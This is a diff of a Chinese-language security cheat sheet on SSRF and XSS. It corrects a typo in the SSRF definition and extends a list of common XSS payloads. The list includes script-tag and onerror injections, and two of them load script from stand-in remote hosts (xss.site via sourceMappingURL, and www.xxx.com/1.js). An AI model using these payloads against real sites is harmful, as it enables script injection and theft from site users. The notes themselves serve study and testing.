@@ -1,5 +1,5 @@
 ## SSRF&XSS
-SRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
+SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
 
 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。
 
@@ -22,7 +22,9 @@ xip.io：10.0.0.1.xip.io = 10.0.0.1
 
 ## 常见payload
 
-```html
+```
+高版本的jQuery 可以使用sourceMappingURL来加载
+- </textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>
 - <script>alert(1);</script>
 - <img src=0 onerror=alert(1)>
 - "><script src=http://www.xxx.com/1.js></script>"
